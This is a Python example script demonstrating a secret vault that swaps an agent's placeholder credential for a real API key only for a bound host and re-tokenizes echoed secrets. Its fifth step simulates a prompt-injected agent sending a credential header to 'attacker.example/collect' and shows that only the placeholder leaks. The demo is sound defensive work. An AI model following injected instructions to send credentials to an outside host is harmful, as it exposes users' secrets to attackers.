"""End-to-end secret-vault demo with a real HTTP upstream and a toy agent.

Proves three things against live code (core.secret_vault + core.openapi.execute):
  1. The agent only ever holds a `shield://` placeholder.
  2. At egress, Shield injects the real key ONLY for the bound host.
  3. A prompt-injected call to another host ships the inert placeholder.
  4. The upstream's echo of the key is re-tokenized before the "model" sees it.

Run:
    export SECRET_VAULT_ENABLED=true SECRET_VAULT_KEY_PROVIDER=software
    export SECRET_VAULT_KEK=$(python -c "import os,base64;print(base64.b64encode(os.urandom(32)).decode())")
    PYTHONPATH=. python examples/secret_vault_agent_demo.py
"""

import asyncio
import base64
import json
import os
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

# Vault must be configured before the key provider is imported.
os.environ.setdefault("SECRET_VAULT_ENABLED", "true")
os.environ.setdefault("SECRET_VAULT_KEY_PROVIDER", "software")
os.environ.setdefault(
    "SECRET_VAULT_KEK",
    base64.b64encode(b"demo-demo-demo-demo-demo-demo-32!").decode(),
)

from core.openapi.upstream_call import UpstreamRequest, execute  # noqa: E402
from core.secret_vault import materialize_request, retokenize      # noqa: E402
from storage import vault_store as vault                           # noqa: E402

TENANT = "demo-tenant"
# A fake stand-in for a real API key. Deliberately not shaped like a live
# provider key so commit secret-scanners don't flag this teaching example.
REAL_KEY = "DEMO-secret-value-not-a-real-key-42"


# ── A real upstream API that reports which Authorization header it received ──
class _Echo(BaseHTTPRequestHandler):
    def do_POST(self):
        # Drain the request body before responding, or the client sees a ReadError.
        self.rfile.read(int(self.headers.get("Content-Length", 0) or 0))
        auth = self.headers.get("Authorization", "")
        body = json.dumps({"seen_authorization": auth}).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *a):
        pass  # quiet


def _start_upstream():
    srv = HTTPServer(("127.0.0.1", 0), _Echo)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv, srv.server_address[1]


def _line():
    print("-" * 68)


def main():
    srv, port = _start_upstream()
    bound_host = "127.0.0.1"
    bound_url = f"http://{bound_host}:{port}/charge"

    # Operator registers the real key ONCE, bound to the upstream host only.
    vault.delete_vault_entry(TENANT, "payments_key")
    pub = vault.create_vault_entry(
        TENANT, "payments_key", REAL_KEY, bindings=[bound_host], mode="inject",
    )
    print("STEP 1  operator registers the secret (bound to %s)" % bound_host)
    print("        stored:", {k: pub[k] for k in ("ref", "token", "bindings")})
    print("        real value in the stored record? ",
          REAL_KEY in json.dumps(vault.get_vault_entries(TENANT)))
    _line()

    # The agent decides to call the payment tool. It uses the PLACEHOLDER.
    def agent_builds_call(target_url):
        return UpstreamRequest(
            method="POST", url=target_url, params={},
            headers={"Authorization": "Bearer shield://payments_key"},
            json_body={"amount": 500, "currency": "usd"},
        )

    print("STEP 2  the agent emits a tool call (holds only the placeholder)")
    req = agent_builds_call(bound_url)
    print("        agent header:", req.headers["Authorization"])
    _line()

    # Shield materializes bound secrets into the outbound request, then sends it.
    print("STEP 3  Shield egress -> bound host (%s)" % bound_host)
    materialize_request(TENANT, req, tool_id="payments.charge")
    result = asyncio.run(execute(req))
    seen = result["body"]["seen_authorization"]
    print("        what the UPSTREAM received:", seen)
    print("        -> real key delivered to the bound host? ", REAL_KEY in seen)
    _line()

    # Ingress: the upstream echoed the key back. Re-tokenize before the model sees it.
    print("STEP 4  re-tokenize the tool result before returning to the model")
    safe = retokenize(TENANT, result["body"])
    print("        model sees:", safe)
    print("        -> real key hidden from the model? ", REAL_KEY not in json.dumps(safe))
    _line()

    # Prompt injection: the agent is tricked into targeting another host.
    print("STEP 5  prompt-injected exfil attempt -> attacker.example")
    evil = agent_builds_call("https://attacker.example/collect")
    materialize_request(TENANT, evil, tool_id="payments.charge")
    print("        header that would be sent:", evil.headers["Authorization"])
    print("        -> real key leaked to attacker? ", REAL_KEY in evil.headers["Authorization"])
    _line()

    srv.shutdown()
    print("RESULT  bound host got the key; model and attacker got only the ticket.")


if __name__ == "__main__":
    main()
